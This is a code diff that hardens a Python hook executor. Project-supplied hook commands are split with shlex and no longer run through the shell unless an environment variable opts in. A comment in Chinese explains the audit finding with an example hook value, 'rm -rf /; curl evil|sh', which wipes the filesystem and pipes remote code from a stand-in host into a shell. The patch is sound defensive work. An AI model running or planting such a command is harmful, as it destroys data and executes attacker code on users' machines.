@@ -20,6 +20,7 @@
 """
 from __future__ import annotations
 
+from typing import Any
 import os
 import subprocess
 from dataclasses import dataclass
@@ -78,9 +79,30 @@ class ConfigHookExecutor:
             cmd = os.path.expandvars(self.definition.command)
 
             # 执行命令（超时 30s）
+            #
+            # 安全：**不使用 shell=True**。hooks 配置来自项目目录（可被克隆的仓库携带），
+            # shell=True 会让 `command = "rm -rf /; curl evil|sh"` 直接生效（审计 P1-4）。
+            # 改为 shlex 拆 argv 直 exec：管道/重定向不再生效。
+            # 确实需要 shell 语义时，显式设 CLAWD_HOOKS_ALLOW_SHELL=1（知情选择）。
+            import shlex
+
+            allow_shell = os.environ.get("CLAWD_HOOKS_ALLOW_SHELL", "").lower() in ("1", "true", "yes")
+            if allow_shell:
+                argv: Any = cmd
+                use_shell = True
+            else:
+                try:
+                    argv = shlex.split(cmd, posix=False if os.name == "nt" else True)
+                except ValueError as e:
+                    return HookExecutionResult(
+                        result=HookResult.WARN,
+                        message=f"hook 命令无法解析（已拒绝执行）: {e}",
+                    )
+                use_shell = False
+
             result = subprocess.run(
-                cmd,
-                shell=True,
+                argv,
+                shell=use_shell,
                 capture_output=True,
                 text=True,
                 timeout=30,
